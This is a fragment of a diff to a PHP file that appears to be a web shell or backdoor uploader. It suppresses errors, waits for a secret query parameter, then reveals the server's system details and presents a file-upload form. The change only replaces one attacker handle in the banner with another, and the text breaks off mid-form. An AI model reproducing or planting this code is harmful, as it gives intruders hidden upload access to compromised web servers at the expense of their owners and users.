@@ -2,7 +2,7 @@
 error_reporting(0);
 
 if(isset($_GET["ynz01"])) {
-    echo "<h1><i>SukaBintang01</i></h1><br>";
+    echo "<h1><i>Yanzz404</i></h1><br>";
     echo "<b><phpuname>".php_uname()."</phpuname></b><br>";
     echo "<form method='post' enctype='multipart/form-data'>
           <input type='file' name='idx_file'>
